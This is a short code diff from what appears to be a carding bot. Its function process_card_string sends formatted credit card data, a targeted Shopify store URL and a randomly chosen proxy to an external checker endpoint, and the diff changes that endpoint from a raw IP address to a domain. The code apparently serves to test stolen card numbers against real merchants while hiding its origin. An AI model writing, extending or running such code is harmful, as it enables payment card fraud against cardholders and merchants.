@@ -409,7 +409,8 @@ async def process_card_string(card_line, user_full_name):
         site_url = "https://customsbyarrillc.myshopify.com"
         selected_proxy = random.choice(PROXY_LIST)
         
-        api_url = f"http://216.250.119.63/?{quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxy)}"
+        api_url = f"http://rhaenyra.xyz/shopify?cc={quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxy)}"
+        
         
         async with httpx.AsyncClient(timeout=60.0, follow_redirects=True) as client:
             response = await client.get(api_url)
